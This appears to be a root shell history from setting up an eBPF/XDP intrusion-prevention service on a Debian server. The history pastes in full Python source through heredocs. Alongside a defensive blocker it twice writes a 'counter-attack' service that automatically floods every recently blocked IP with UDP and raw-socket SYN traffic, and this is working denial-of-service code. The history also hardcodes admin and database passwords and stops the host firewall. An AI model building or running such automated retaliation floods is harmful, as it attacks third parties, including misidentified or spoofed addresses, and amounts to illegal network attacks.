ls
dpkg -i kernel-xdp-ips_1.0.1_amd64.deb 
ls
wget https://github.com/unknowerror-hub/AI-firewall-gateway/blob/3d759a2ed28189c8c07cb05d8a21eaa5e9666aa3/kernel-xdp-ips_1.0.3_amd64.deb
sudo dpkg -i /root/kernel-xdp-ips_1.0.3_amd64.deb
sudo apt-get install -f -y
ls
rm kernel-xdp-ips_1.0.1_amd64.deb 
rm kernel-xdp-ips_1.0.3_amd64.deb 
wget https://github.com/unknowerror-hub/AI-firewall-gateway/blob/5f7a0a92355d0983e0e9219c1f3405ac0cece22c/kernel-xdp-ips_1.0.3_amd64.deb
sudo dpkg -i /root/kernel-xdp-ips_1.0.3_amd64.deb
ls
rm kernel-xdp-ips_1.0.3_amd64.deb 
wget https://github.com/unknowerror-hub/AI-firewall-gateway/blob/f3b59ae8c7519c749a537c7a0ddcbd4844794941/kernel-xdp-ips_1.0.3_amd64.deb
sudo dpkg -i /root/kernel-xdp-ips_1.0.3_amd64.deb
ls
rm kernel-xdp-ips_1.0.3_amd64.deb 
https://github.com/unknowerror-hub/AI-firewall-gateway/blob/0dfcbbfb3a6548726e9c2d097a95bb74c0d68c88/kernel-xdp-ips_1.0.3_amd64.deb
wget https://github.com/unknowerror-hub/AI-firewall-gateway/blob/0dfcbbfb3a6548726e9c2d097a95bb74c0d68c88/kernel-xdp-ips_1.0.3_amd64.deb
mv /root/kernel-xdp-ips_1.0.3_amd64.deb /tmp/
chmod 644 /tmp/kernel-xdp-ips_1.0.3_amd64.deb
sudo dpkg -i /tmp/kernel-xdp-ips_1.0.3_amd64.deb
ls
rm build_installer.py 
rm build_package.sh 
rm nano 
mkdir ai
cd ai/kernel_ids/
св
 св
cd
mkdir -p /tmp/ids-package/DEBIAN
mkdir -p /tmp/ids-package/opt/kernel_ids/static
mkdir -p /tmp/ids-package/etc/systemd/system
cp /ai/kernel_ids/static/style.css /tmp/ids-package/opt/kernel_ids/static/
cp /root/ai/kernel_ids/static/style.css /tmp/ids-package/opt/kernel_ids/static/
nano /tmp/ids-package/DEBIAN/control
nano /tmp/ids-package/DEBIAN/postinst
chmod 755 /tmp/ids-package/DEBIAN/postinst
nano /tmp/ids-package/opt/kernel_ids/static/app.js
nano /root/build_package.sh
chmod +x /root/build_package.sh
/root/build_package.sh
nano build_package.sh 
/root/build_package.sh
nano build_package.sh 
/root/build_package.sh
nano build_package.sh 
/root/build_package.sh
/root/build_package.sh
/root/build_package.sh
sudo dpkg -i /tmp/kernel-xdp-ips_1.0.3_amd64.deb
sudo dpkg -i /tmp/kernel-xdp-ips_1.0.3_amd64.deb
sudo apt-get install -f -y
sudo systemctl status xdp-main xdp-counter xdp-gateway xdp-monitor
UVICORN_PATH=$(which uvicorn || echo "/usr/local/bin/uvicorn")
sudo sed -i "s|/usr/bin/uvicorn|${UVICORN_PATH}|g" /etc/systemd/system/xdp-*.service
sudo systemctl daemon-reload
sudo systemctl reset-failed xdp-main xdp-counter xdp-gateway xdp-monitor
sudo systemctl restart xdp-main xdp-counter xdp-gateway xdp-monitor
sudo systemctl status xdp-main.service xdp-counter.service
reboot
wget https://github.com/unknowerror-hub/AI-firewall-gateway/blob/ae5a54a8a04ce6ee43def4ea3005ce91f0665c00/kernel-xdp-ips_1.0.2_amd64.deb
ls
sudo apt install -y kernel-xdp-ips_1.0.2_amd64.deb
ls
sudo apt install -y kernel-xdp-ips_1.0.2_amd64.deb
ls
sudo apt install -y /kernel-xdp-ips_1.0.2_amd64.deb
sudo apt install -y /root/kernel-xdp-ips_1.0.2_amd64.deb
chmod 644 /root/kernel-xdp-ips_1.0.2_amd64.deb
sudo apt install -y /root/kernel-xdp-ips_1.0.2_amd64.deb
sudo dpkg -i /root/kernel-xdp-ips_1.0.2_amd64.deb
ls
rm kernel-xdp-ips_1.0.2_amd64.deb 
wget https://github.com/unknowerror-hub/AI-firewall-gateway/blob/d7cb6db9679723c445ecf756085f56e9129007ce/kernel-xdp-ips_1.0.2_amd64.deb
sudo dpkg -i /root/kernel-xdp-ips_1.0.2_amd64.deb
rm -f /root/kernel-xdp-ips_1.0.2_amd64.deb
wget https://github.com/unknowerror-hub/AI-firewall-gateway/blob/7aa28fb10d9fca328e16fbdd3fd5fbf078167ead/kernel-xdp-ips_1.0.2_amd64.deb
sudo dpkg -i /root/kernel-xdp-ips_1.0.2_amd64.deb
ifconfig
ipconfig
apt install net-tools
ifconfig
nano nano /root/build_package.sh
nanщ /root/build_package.sh
nano /root/build_package.sh
chmod +x /root/build_package.sh
/root/build_package.sh
sudo apt update && sudo apt install -y curl
/root/build_package.sh
git clone https://github.com/unknowerror-hub/AI-firewall-gateway.git
ls
cd AI-firewall-gateway/
ls
cd
sudo systemctl status xdp-main.service xdp-counter.service
sudo sed -i 's|ExecStart=/usr/local/bin/uvicorn|ExecStart=/usr/bin/python3 -m uvicorn|g' /etc/systemd/system/xdp-*.service
sudo sed -i 's|ExecStart=/usr/bin/uvicorn|ExecStart=/usr/bin/python3 -m uvicorn|g' /etc/systemd/system/xdp-*.service
sudo systemctl daemon-reload
sudo systemctl reset-failed xdp-main xdp-counter xdp-gateway xdp-monitor
sudo systemctl restart xdp-main xdp-counter xdp-gateway xdp-monitor
sudo systemctl status xdp-main.service xdp-counter.service
cat << 'EOF' > /opt/kernel_ids/main.py
import socket, struct, threading, queue, ctypes, secrets, psycopg2, numpy as np
from fastapi import FastAPI, Form, Depends, HTTPException
from fastapi.responses import HTMLResponse
from fastapi.security import HTTPBasic, HTTPBasicCredentials
from bcc import BPF
from sklearn.ensemble import IsolationForest

app = FastAPI()
security = HTTPBasic()
SECURITY_USER, SECURITY_PASS = "admin", "kernel_secure_2026"

def auth(c: HTTPBasicCredentials = Depends(security)):
    if not (secrets.compare_digest(c.username, SECURITY_USER) and secrets.compare_digest(c.password, SECURITY_PASS)): raise HTTPException(401)
    return c.username

# Исправленный и безопасный разбор файла конфигурации сети
def get_interface_name():
    try:
        with open("ids.conf", "r") as f:
            for line in f:
                if "INTERFACE" in line:
                    return line.split("=")[1].replace('"', '').strip()
    except:
        pass
    return "ens3"

INTERFACE = get_interface_name()
db_conf = "dbname=ids_db user=postgres password=ids_pass host=localhost"
conn = psycopg2.connect(db_conf); cursor = conn.cursor()
cursor.execute("CREATE TABLE IF NOT EXISTS security_events (id SERIAL PRIMARY KEY, src_ip TEXT, dport INT, action TEXT, reason TEXT, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP);")
cursor.execute("CREATE TABLE IF NOT EXISTS managed_lists (src_ip TEXT PRIMARY KEY, list_type TEXT, updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP);")
conn.commit()

bpf_ctx = BPF(src_file="xdp_filter.c")
bpf_fn = bpf_ctx.load_func("xdp_fw_router", BPF.XDP)
bpf_ctx.attach_xdp(INTERFACE, bpf_fn, 0)
ai_queue = queue.Queue(maxsize=10000)

def u32_to_ip(n): return socket.inet_ntoa(struct.pack("<I", n))
def ip_to_u32(s): return struct.unpack("<I", socket.inet_aton(s))[0]

def trigger_auto_block(ip_str, port, r):
    try:
        bpf_ctx["blacklist_map"][ctypes.c_uint32(ip_to_u32(ip_str))] = ctypes.c_uint8(1)
        l_conn = psycopg2.connect(db_conf); l_cur = l_conn.cursor()
        l_cur.execute("INSERT INTO managed_lists (src_ip, list_type) VALUES (%s, 'BLACK') ON CONFLICT (src_ip) DO UPDATE SET list_type='BLACK';", (ip_str,))
        l_cur.execute("INSERT INTO security_events (src_ip, dport, action, reason) VALUES (%s, %s, 'BLOCKED', %s);", (ip_str, port, r))
        l_conn.commit(); l_cur.close(); l_conn.close()
    except Exception as e: print(f"[-] Block Error: {e}")

def ai_worker():
    ai = IsolationForest(contamination=0.02, random_state=42); buf = []
    while True:
        try:
            ip, dp, sp = ai_queue.get()
            buf.append([dp, sp])
            if len(buf) >= 50:
                ai.fit(np.array(buf))
                if ai.predict(np.array(buf))[-1] == -1: trigger_auto_block(ip, dp, "AI Anomaly Detected")
                buf = buf[-20:]
            ai_queue.task_done()
        except: pass

def packet_callback(cpu, data, size):
    try:
        event = bpf_ctx["events"].event(data)
        if not ai_queue.full(): ai_queue.put_nowait((u32_to_ip(event.src_ip), event.dport, event.sport))
    except: pass

@app.on_event("startup")
def startup():
    threading.Thread(target=ai_worker, daemon=True).start()
    threading.Thread(target=lambda: bpf_ctx["events"].open_perf_buffer(packet_callback, page_cnt=256) or [bpf_ctx.perf_buffer_poll() for _ in iter(int, 1)], daemon=True).start()

@app.get("/", response_class=HTMLResponse)
def dash(u=Depends(auth)): return "<h1>Core IPS Active</h1>"
EOF

cat << 'EOF' > /opt/kernel_ids/counter.py
import socket, struct, threading, time, secrets, random, psycopg2, numpy as np
from fastapi import FastAPI, Form, Depends, HTTPException, Response
from fastapi.responses import HTMLResponse
from fastapi.security import HTTPBasic, HTTPBasicCredentials
from psycopg2 import pool

app = FastAPI(title="XDP Cyber Counter-Attack Engine")
security = HTTPBasic()
SECURITY_USER, SECURITY_PASS = "admin", "kernel_secure_2026"
db_conf = "dbname=ids_db user=postgres password=ids_pass host=localhost"
db_pool = pool.ThreadedConnectionPool(1, 10, db_conf)

ATTACK_METRICS = {"active_targets": 0, "packets_sent": 0, "last_attack_type": "None", "ai_aggression_level": 50, "is_auto_retaliation": True}
metrics_lock = threading.Lock(); active_retaliations = set()

def authenticate(credentials: HTTPBasicCredentials = Depends(security)):
    if not (secrets.compare_digest(credentials.username, SECURITY_USER) and secrets.compare_digest(credentials.password, SECURITY_PASS)):
        raise HTTPException(401, "Unauthorized")
    return credentials.username

def ai_calculate_retaliation(dport, attack_count):
    # Ошибка синтаксиса успешно исправлена
    strategy = 1 if dport in [80, 443, 8080] else (0 if dport == 0 else 2)
    threads = max(1, int(ATTACK_METRICS["ai_aggression_level"] / 10) * (2 if attack_count > 10 else 1))
    return strategy, threads

def flood_udp(target_ip, duration=30):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random._urandom(1024)
    end = time.time() + duration
    while time.time() < end and target_ip in active_retaliations:
        try:
            sock.sendto(payload, (target_ip, random.randint(1, 65535)))
            with metrics_lock: ATTACK_METRICS["packets_sent"] += 1
        except: pass

def flood_tcp_syn(target_ip, duration=30):
    try: sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    except: return
    payload = random._urandom(64)
    end = time.time() + duration
    while time.time() < end and target_ip in active_retaliations:
        try:
            sock.sendto(payload, (target_ip, random.randint(1, 65535)))
            with metrics_lock: ATTACK_METRICS["packets_sent"] += 1
        except: pass

def retaliation_orchestrator():
    while True:
        if ATTACK_METRICS["is_auto_retaliation"]:
            try:
                conn = db_pool.getconn(); cur = conn.cursor()
                cur.execute("SELECT src_ip, dport, COUNT(*) FROM security_events WHERE action = 'BLOCKED' AND created_at > NOW() - INTERVAL '10 second' GROUP BY src_ip, dport;")
                targets = cur.fetchall(); db_pool.putconn(conn)
                for ip, dport, count in targets:
                    if ip in active_retaliations: continue
                    strat, threads = ai_calculate_retaliation(dport, count)
                    active_retaliations.add(ip)
                    with metrics_lock:
                        ATTACK_METRICS["active_targets"] = len(active_retaliations)
                        ATTACK_METRICS["last_attack_type"] = "TCP-SYN" if strat == 1 else "UDP-Flood"
                    func = flood_tcp_syn if strat == 1 else flood_udp
                    for _ in range(threads): threading.Thread(target=func, args=(ip, 20), daemon=True).start()
            except: pass
        time.sleep(5)

@app.get("/", response_class=HTMLResponse)
def counter_dashboard(u=Depends(authenticate)):
    conn = db_pool.getconn(); cur = conn.cursor()
    cur.execute("SELECT src_ip, dport, action, reason FROM security_events LIMIT 10;")
    rows = "".join([f"<tr><td>{l[0]}</td><td>{l[1]}</td><td>{l[2]}</td><td>{l[3]}</td></tr>" for l in cur.fetchall()])
    db_pool.putconn(conn)
    return f"<html><body><h1>🔥 AI Retaliation Engine Active</h1><table>{rows}</table></body></html>"

@app.on_event("startup")
def startup(): threading.Thread(target=retaliation_orchestrator, daemon=True).start()
EOF

sudo systemctl reset-failed xdp-main xdp-counter xdp-gateway xdp-monitor
sudo systemctl restart xdp-main xdp-counter xdp-gateway xdp-monitor
sudo systemctl status xdp-main.service xdp-counter.service
netsta
netstat
sudo ufw allow 8000/tcp
sudo ufw allow 8001/tcp
sudo ufw allow 8002/tcp
sudo ufw allow 8005/tcp
sudo ufw reload
sudo iptables -A INPUT -p tcp --dport 8000:8005 -j ACCEPT
sudo ss -tlnp | grep -E '8000|8001|8002|8005'
sudo systemctl stop nftables
sudo iptables -I INPUT -p tcp --dport 8000:8005 -j ACCEPT
sudo ss -tlnp | grep -E '8000|8001|8002|8005'
sudo journalctl -u xdp-main.service -n 50 --no-pager
sudo apt update && sudo apt install -y bpfcc-tools libbpfcc-dev linux-headers-amd64 python3-pip
sudo pip3 install bcc fastapi uvicorn psutil psycopg2-binary scikit-learn numpy --break-system-packages
sudo systemctl reset-failed xdp-main xdp-counter xdp-gateway xdp-monitor
sudo systemctl restart xdp-main xdp-counter xdp-gateway xdp-monitor
sudo ss -tlnp | grep -E '8000|8001|8002|8005'
sudo ss -tlnp | grep -E '8000|8001|8002|8005'
find /usr/lib/python3/dist-packages/ -name "bcc"
sudo ln -s /usr/lib/python3/dist-packages/bcc /usr/lib/python3.13/dist-packages/bcc 2>/dev/null || true
sudo ln -s /usr/lib/python3/dist-packages/bcc /usr/local/lib/python3.13/dist-packages/bcc 2>/dev/null || true
python3 -c "from bcc import BPF; print('BCC import OK')"
sudo ln -s /usr/lib/python3/dist-packages/bcc /usr/lib/python3.13/dist-packages/bcc 2>/dev/null || true
sudo ln -s /usr/lib/python3/dist-packages/bcc /usr/local/lib/python3
python3 -c "from bcc import BPF; print('BCC import OK')"
sudo sed -i 's/strategy = 1 if dport in else/strategy = 1 if dport in [80, 443, 8080] else/g' /opt/kernel_ids/counter.py
sudo systemctl reset-failed xdp-main xdp-counter xdp-gateway xdp-monitor
sudo systemctl restart xdp-main xdp-counter xdp-gateway xdp-monitor
sudo ss -tlnp | grep -E '8000|8001|8002|8005'
sudo sed -i 's/strategy = 1 if dport in else/strategy = 1 if dport in (80, 443, 8080) else/g' /opt/kernel_ids/counter.py
sudo sed -i 's/line.split("=").replace/line.split("=")[1].replace/g' /opt/kernel_ids/main.py
sudo systemctl reset-failed xdp-main xdp-counter xdp-gateway xdp-monitor
sudo systemctl restart xdp-main xdp-counter xdp-gateway xdp-monitor
sudo ss -tlnp | grep -E '8000|8001|8002|8005'
cat << 'EOF' > /opt/kernel_ids/main.py
import socket, struct, threading, queue, ctypes, secrets, psycopg2, numpy as np
from fastapi import FastAPI, Form, Depends, HTTPException
from fastapi.responses import HTMLResponse
from fastapi.security import HTTPBasic, HTTPBasicCredentials
from bcc import BPF
from sklearn.ensemble import IsolationForest

app = FastAPI()
security = HTTPBasic()
SECURITY_USER, SECURITY_PASS = "admin", "kernel_secure_2026"

def auth(c: HTTPBasicCredentials = Depends(security)):
    if not (secrets.compare_digest(c.username, SECURITY_USER) and secrets.compare_digest(c.password, SECURITY_PASS)): raise HTTPException(401)
    return c.username

def get_interface_name():
    try:
        with open("ids.conf", "r") as f:
            for line in f:
                if "INTERFACE" in line:
                    return line.split("=")[1].replace('"', '').strip()
    except:
        pass
    return "ens3"

INTERFACE = get_interface_name()
db_conf = "dbname=ids_db user=postgres password=ids_pass host=localhost"
conn = psycopg2.connect(db_conf); cursor = conn.cursor()
cursor.execute("CREATE TABLE IF NOT EXISTS security_events (id SERIAL PRIMARY KEY, src_ip TEXT, dport INT, action TEXT, reason TEXT, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP);")
cursor.execute("CREATE TABLE IF NOT EXISTS managed_lists (src_ip TEXT PRIMARY KEY, list_type TEXT, updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP);")
conn.commit()

bpf_ctx = BPF(src_file="xdp_filter.c")
bpf_fn = bpf_ctx.load_func("xdp_fw_router", BPF.XDP)
bpf_ctx.attach_xdp(INTERFACE, bpf_fn, 0)
ai_queue = queue.Queue(maxsize=10000)

def u32_to_ip(n): return socket.inet_ntoa(struct.pack("<I", n))
def ip_to_u32(s): return struct.unpack("<I", socket.inet_aton(s))[0]

def trigger_auto_block(ip_str, port, r):
    try:
        bpf_ctx["blacklist_map"][ctypes.c_uint32(ip_to_u32(ip_str))] = ctypes.c_uint8(1)
        l_conn = psycopg2.connect(db_conf); l_cur = l_conn.cursor()
        l_cur.execute("INSERT INTO managed_lists (src_ip, list_type) VALUES (%s, 'BLACK') ON CONFLICT (src_ip) DO UPDATE SET list_type='BLACK';", (ip_str,))
        l_cur.execute("INSERT INTO security_events (src_ip, dport, action, reason) VALUES (%s, %s, 'BLOCKED', %s);", (ip_str, port, r))
        l_conn.commit(); l_cur.close(); l_conn.close()
    except Exception as e: print(f"[-] Block Error: {e}")

def ai_worker():
    ai = IsolationForest(contamination=0.02, random_state=42); buf = []
    while True:
        try:
            ip, dp, sp = ai_queue.get()
            buf.append([dp, sp])
            if len(buf) >= 50:
                ai.fit(np.array(buf))
                if ai.predict(np.array(buf))[-1] == -1: trigger_auto_block(ip, dp, "AI Anomaly Detected")
                buf = buf[-20:]
            ai_queue.task_done()
        except: pass

def packet_callback(cpu, data, size):
    try:
        event = bpf_ctx["events"].event(data)
        if not ai_queue.full(): ai_queue.put_nowait((u32_to_ip(event.src_ip), event.dport, event.sport))
    except: pass

@app.on_event("startup")
def startup():
    threading.Thread(target=ai_worker, daemon=True).start()
    threading.Thread(target=lambda: bpf_ctx["events"].open_perf_buffer(packet_callback, page_cnt=256) or [bpf_ctx.perf_buffer_poll() for _ in iter(int, 1)], daemon=True).start()

@app.get("/", response_class=HTMLResponse)
def dash(u=Depends(auth)): return "<h1>Core IPS Active</h1>"
EOF

cat << 'EOF' > /opt/kernel_ids/counter.py
import socket, struct, threading, time, secrets, random, psycopg2, numpy as np
from fastapi import FastAPI, Form, Depends, HTTPException, Response
from fastapi.responses import HTMLResponse
from fastapi.security import HTTPBasic, HTTPBasicCredentials
from psycopg2 import pool

app = FastAPI()
security = HTTPBasic()
SECURITY_USER, SECURITY_PASS = "admin", "kernel_secure_2026"
db_conf = "dbname=ids_db user=postgres password=ids_pass host=localhost"
db_pool = pool.ThreadedConnectionPool(1, 10, db_conf)

ATTACK_METRICS = {"active_targets": 0, "packets_sent": 0, "last_attack_type": "None", "ai_aggression_level": 50, "is_auto_retaliation": True}
metrics_lock = threading.Lock(); active_retaliations = set()

def authenticate(credentials: HTTPBasicCredentials = Depends(security)):
    if not (secrets.compare_digest(credentials.username, SECURITY_USER) and secrets.compare_digest(credentials.password, SECURITY_PASS)):
        raise HTTPException(401, "Unauthorized")
    return credentials.username

def ai_calculate_retaliation(dport, attack_count):
    # Строгий рабочий синтаксис условий проверки портов
    if dport in (80, 443, 8080):
        strategy = 1
    elif dport == 0:
        strategy = 0
    else:
        strategy = 2
    threads = max(1, int(ATTACK_METRICS["ai_aggression_level"] / 10) * (2 if attack_count > 10 else 1))
    return strategy, threads

def flood_udp(target_ip, duration=30):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random._urandom(1024)
    end = time.time() + duration
    while time.time() < end and target_ip in active_retaliations:
        try:
            sock.sendto(payload, (target_ip, random.randint(1, 65535)))
            with metrics_lock: ATTACK_METRICS["packets_sent"] += 1
        except: pass

def flood_tcp_syn(target_ip, duration=30):
    try: sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    except: return
    payload = random._urandom(64)
    end = time.time() + duration
    while time.time() < end and target_ip in active_retaliations:
        try:
            sock.sendto(payload, (target_ip, random.randint(1, 65535)))
            with metrics_lock: ATTACK_METRICS["packets_sent"] += 1
        except: pass

def retaliation_orchestrator():
    while True:
        if ATTACK_METRICS["is_auto_retaliation"]:
            try:
                conn = db_pool.getconn(); cur = conn.cursor()
                cur.execute("SELECT src_ip, dport, COUNT(*) FROM security_events WHERE action = 'BLOCKED' AND created_at > NOW() - INTERVAL '10 second' GROUP BY src_ip, dport;")
                targets = cur.fetchall(); db_pool.putconn(conn)
                for ip, dport, count in targets:
                    if ip in active_retaliations: continue
                    strat, threads = ai_calculate_retaliation(dport, count)
                    active_retaliations.add(ip)
                    with metrics_lock:
                        ATTACK_METRICS["active_targets"] = len(active_retaliations)
                        ATTACK_METRICS["last_attack_type"] = "TCP-SYN" if strat == 1 else "UDP-Flood"
                    func = flood_tcp_syn if strat == 1 else flood_udp
                    for _ in range(threads): threading.Thread(target=func, args=(ip, 20), daemon=True).start()
            except: pass
        time.sleep(5)

@app.get("/", response_class=HTMLResponse)
def counter_dashboard(u=Depends(authenticate)):
    conn = db_pool.getconn(); cur = conn.cursor()
    cur.execute("SELECT src_ip, dport, action, reason FROM security_events LIMIT 10;")
    rows = "".join([f"<tr><td>{l[0]}</td><td>{l[1]}</td><td>{l[2]}</td><td>{l[3]}</td></tr>" for l in cur.fetchall()])
    db_pool.putconn(conn)
    return f"<html><body><h1>🔥 AI Retaliation Engine Active</h1><table>{rows}</table></body></html>"

@app.on_event("startup")
def startup(): threading.Thread(target=retaliation_orchestrator, daemon=True).start()
EOF

sudo systemctl reset-failed xdp-main xdp-counter xdp-gateway xdp-monitor
sudo systemctl restart xdp-main xdp-counter xdp-gateway xdp-monitor
sudo ss -tlnp | grep -E '8000|8001|8002|8005'
netstat
sudo systemctl stop xdp-main xdp-counter xdp-gateway xdp-monitor
cd /opt/kernel_ids && python3 -m uvicorn monitor_core:app --host 0.0.0.0 --port 8005
cd
sudo -u postgres psql -c "ALTER USER postgres WITH PASSWORD 'ids_pass';"
cd /opt/kernel_ids && python3 -m uvicorn monitor_core:app --host 0.0.0.0 --port 8005
sudo systemctl reset-failed xdp-main xdp-counter xdp-gateway xdp-monitor
cd
sudo systemctl restart xdp-main xdp-counter xdp-gateway xdp-monitor
sudo ss -tlnp | grep -E '8000|8001|8002|8005'
sudo ss -tlnp | grep -E '8000|8001|8002|8005'
sudo ss -tlnp | grep -E '8000|8001|8002|8005'
reboot
 sudo ss -tlnp | grep -E '8000|8001|8002|8005'
LISTEN 0      2048         0.0.0.0:8002       0.0.0.0:*    users:(("python3",pid=8277,fd=14)) 
LISTEN 0      2048         0.0.0.0:8001       0.0.0.0:*    users:(("python3",pid=8276,fd=13)) 
LISTEN 0      2048         0.0.0.0:8005       0.0.0.0:*    users:(("python3",pid=8278,fd=13)) 
sudo ss -tlnp | grep -E '8000|8001|8002|8005'
cd
cd
cd
cd
ды
ls
sudo systemctl stop xdp-main xdp-counter xdp-gateway xdp-monitor
htop
apt install htop
htop
nano /opt/kernel_ids/main.py 
sudo systemctl restart xdp-main xdp-counter xdp-gateway xdp-monitor
htop
cd /opt/kernel_ids/
ls
rm counter.py 
nano counter.py 
sudo systemctl restart xdp-main xdp-counter xdp-gateway xdp-monitor
